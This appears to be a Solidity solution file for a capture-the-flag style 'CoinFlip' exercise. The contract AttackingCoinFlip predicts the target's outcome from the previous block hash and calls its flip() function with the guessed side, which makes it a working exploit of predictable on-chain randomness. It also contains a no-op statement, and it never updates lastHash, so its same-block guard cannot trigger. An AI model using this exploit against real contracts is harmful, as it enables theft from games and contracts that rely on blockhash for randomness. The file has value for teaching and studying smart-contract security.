// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    // address of the CoinFlip contract
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 private lastHash;

    function hackContract() external {
        // Code me!
        
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("SAME_BLOCK");
        }

        blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(contractAddress).flip(side);


    }
}
